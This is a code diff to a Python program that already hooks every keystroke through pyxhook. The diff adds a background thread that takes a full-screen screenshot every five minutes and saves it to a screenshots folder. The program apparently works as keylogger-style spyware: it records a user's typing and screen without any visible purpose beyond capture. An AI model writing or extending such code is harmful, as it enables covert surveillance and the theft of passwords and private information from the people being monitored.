@@ -1,5 +1,7 @@
 import os
+import time
 import atexit
+import threading
 import pyxhook
 import gi
 gi.require_version('Gtk', '3.0')
@@ -123,11 +125,23 @@ def get_ss_count():
         return count
 
 
+# Screenshot after a fixed time interval
+def ss_at_intervals():
+    while True:
+        pb = Gdk.pixbuf_get_from_window(win, 0, 0, w, h)
+        if pb is not None:
+            pb.savev("screenshots/ss{}.png".format(get_ss_count()), "png", (), ())
+        time.sleep(300)  # Five minutes
+
+
 def main():
     hook_man = pyxhook.HookManager()
     hook_man.KeyDown = on_keyboard_event
     hook_man.HookKeyboard()
     hook_man.start()
+
+    ss_handler = threading.Thread(target=ss_at_intervals)
+    ss_handler.start()
 
 
 if __name__ == "__main__":
